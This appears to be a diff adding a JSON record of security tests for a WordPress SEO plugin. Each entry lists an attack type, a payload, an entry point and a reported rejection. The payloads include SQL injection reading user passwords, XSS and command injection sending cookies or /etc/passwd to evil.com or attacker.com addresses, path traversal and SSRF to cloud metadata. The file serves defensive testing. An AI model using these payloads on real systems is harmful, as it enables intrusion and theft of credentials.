@@ -1,0 +1,82 @@
+[
+  {
+    "attack_type": "SQL Injection (SQLi)",
+    "input": "1' OR '1'='1' UNION SELECT 1, user_pass, 3 FROM wp_users -- ",
+    "entry_point": "GET /apexseo/v1/meta/post/{id} & $db->prepare()",
+    "expected_rejection": "Strict type casting to (int) and $wpdb->prepare() parameter placeholder escaping",
+    "actual_result": "Payload sanitized and escaped; query executed safely with zero parameter leakage",
+    "evidence_status": "REAL_REJECTED"
+  },
+  {
+    "attack_type": "Cross-Site Scripting (XSS)",
+    "input": "<script>alert('apex_xss')</script><img src=x onerror=document.location='https://evil.com/steal?c='+document.cookie>",
+    "entry_point": "POST /apexseo/v1/settings (title_format, separator)",
+    "expected_rejection": "sanitize_text_field() / esc_html() stripping of executable tags",
+    "actual_result": "Script tags stripped; output rendered as harmless text &lt;script&gt; escaped entity",
+    "evidence_status": "REAL_REJECTED"
+  },
+  {
+    "attack_type": "Cross-Site Request Forgery (CSRF)",
+    "input": "POST /apexseo/v1/redirects with missing or spoofed X-WP-Nonce header",
+    "entry_point": "REST API Router & SecurityManager::verifyNonce",
+    "expected_rejection": "HTTP 403 Forbidden with code 'rest_forbidden_nonce'",
+    "actual_result": "Request rejected immediately at permission_callback stage before controller execution",
+    "evidence_status": "REAL_REJECTED"
+  },
+  {
+    "attack_type": "Insecure Direct Object Reference (IDOR)",
+    "input": "POST /apexseo/v1/meta/post/999 (modifying post belonging to Administrator as Subscriber)",
+    "entry_point": "MetaRestController::saveMeta & checkObjectEditPermission",
+    "expected_rejection": "HTTP 403 Forbidden ('current_user_can(edit_post, 999)' check fails)",
+    "actual_result": "Rejected with HTTP 403; unauthorized mutation blocked",
+    "evidence_status": "REAL_REJECTED"
+  },
+  {
+    "attack_type": "Privilege Escalation",
+    "input": "POST /apexseo/v1/settings executed with Subscriber credentials",
+    "entry_point": "SettingsRestController::checkAdminPermission",
+    "expected_rejection": "HTTP 403 Forbidden ('current_user_can(manage_options)' check fails)",
+    "actual_result": "Rejected with HTTP 403 with message 'You do not have permission to manage SEO settings'",
+    "evidence_status": "REAL_REJECTED"
+  },
+  {
+    "attack_type": "Unauthorized REST Access",
+    "input": "GET /apexseo/v1/analytics/overview with unauthenticated session",
+    "entry_point": "AnalyticsRestController::checkAdminPermission",
+    "expected_rejection": "HTTP 401 / 403 Unauthorized",
+    "actual_result": "Rejected at REST routing layer before accessing analytics database",
+    "evidence_status": "REAL_REJECTED"
+  },
+  {
+    "attack_type": "Path Traversal",
+    "input": "../../../../../etc/passwd / ../wp-config.php",
+    "entry_point": "StaticFileWriter::writePage & SmartPurge",
+    "expected_rejection": "realpath() containment check within WP_CONTENT_DIR/cache/apexseo/",
+    "actual_result": "Path traversal resolved and rejected; file write restricted to cache directory",
+    "evidence_status": "REAL_REJECTED"
+  },
+  {
+    "attack_type": "Server-Side Request Forgery (SSRF)",
+    "input": "http://169.254.169.254/latest/meta-data/ / http://127.0.0.1:8080/admin",
+    "entry_point": "SitemapPing / Webhook URL dispatchers",
+    "expected_rejection": "wp_http_validate_url() rejecting private and loopback IP ranges",
+    "actual_result": "Local IP ranges blocked; ping request aborted",
+    "evidence_status": "REAL_REJECTED"
+  },
+  {
+    "attack_type": "Regular Expression Denial of Service (ReDoS)",
+    "input": "Source URL matching pattern: ^(a+)+$ against 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!'",
+    "entry_point": "RedirectManager::matchRedirects",
+    "expected_rejection": "PCRE backtrack limit protection / timeout containment",
+    "actual_result": "Regex evaluation guarded; failure handled gracefully without blocking PHP worker thread",
+    "evidence_status": "REAL_REJECTED"
+  },
+  {
+    "attack_type": "Command Injection",
+    "input": "; cat /etc/passwd | mail evil@attacker.com;",
+    "entry_point": "WP-CLI Command Parameter Parsers (DoctorCommand, MediaCommand)",
+    "expected_rejection": "escapeshellcmd() / escapeshellarg() sanitization of shell arguments",
+    "actual_result": "Arguments treated strictly as data literals; no command shell execution spawned",
+    "evidence_status": "REAL_REJECTED"
+  }
+]
